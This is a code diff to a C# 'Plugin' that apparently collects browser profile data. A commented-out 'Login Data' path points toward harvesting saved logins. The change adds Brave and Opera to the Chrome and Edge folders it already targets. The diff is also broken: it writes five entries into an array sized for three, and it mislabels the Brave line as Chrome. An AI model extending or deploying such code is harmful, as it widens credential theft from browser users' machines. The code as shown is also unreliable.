@@ -26,12 +26,15 @@ namespace Plugin
             string homeDrive = System.Environment.GetEnvironmentVariable("HOMEDRIVE");
             string homePath = System.Environment.GetEnvironmentVariable("HOMEPATH");
             string localAppData = System.Environment.GetEnvironmentVariable("LOCALAPPDATA");
+            string AppData = System.Environment.GetEnvironmentVariable("APPDATA"); // Added appdata as a valid path
 
             string[] paths = new string[3];
             //paths[0] = homeDrive + homePath + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\";
             paths[0] = localAppData + "\\Google\\Chrome\\User Data\\";
             paths[1] = localAppData + "\\Microsoft\\Edge\\User Data\\";
             paths[2] = localAppData + "\\Microsoft\\Edge Beta\\User Data\\";
+            paths[3] = localAppData + "\\BraveSoftware\\Brave-Browser\\User Data"; // Added Chrome
+            paths[4] = AppData + "\\Opera Software\\Opera Stable"; // Added Opera
             //string chromeLoginDataPath = "C:\\Users\\Dwight\\Desktop\\Login Data";
 
 
@@ -47,9 +50,15 @@ namespace Plugin
                     } else if (path.ToLower().Contains("edge beta"))
                     {
                         browser = "Edge Beta";
-                    } else
+                    } else if (path.ToLower().Contains("edge"))
                     {
                         browser = "Edge";
+                    } else if (path.ToLower().Contains("brave"))
+                    {
+                        browser = "Brave";
+                    } else
+                    {
+                        browser = "Opera"; 
                     }
                     Console.WriteLine(string.Format(fmtString, "Beginning", browser));
                     // do something
